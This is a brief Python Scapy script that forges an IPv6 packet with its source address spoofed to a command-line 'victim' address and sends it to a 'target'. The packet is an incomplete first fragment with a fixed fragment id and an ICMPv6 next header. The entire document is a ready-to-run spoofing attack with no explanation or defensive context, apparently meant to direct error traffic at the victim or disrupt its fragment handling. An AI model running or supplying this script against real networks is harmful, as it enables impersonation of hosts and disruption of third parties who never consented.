#!/usr/bin/python
from scapy.all import *

# Victim address
sip=sys.argv[1]

# Target address
dip=sys.argv[2]

# Payload
payloadspoofed=Raw("X"*1000)

# IPv6 header
IP=IPv6(src=sip, dst=dip)

# Fragment header
fragspoofed=IPv6ExtHdrFragment(offset=0, m=1, id=12345, nh=58)

# Packet
packetspoofed=IP/fragspoofed/payloadspoofed

# Sending packet
send(packetspoofed)

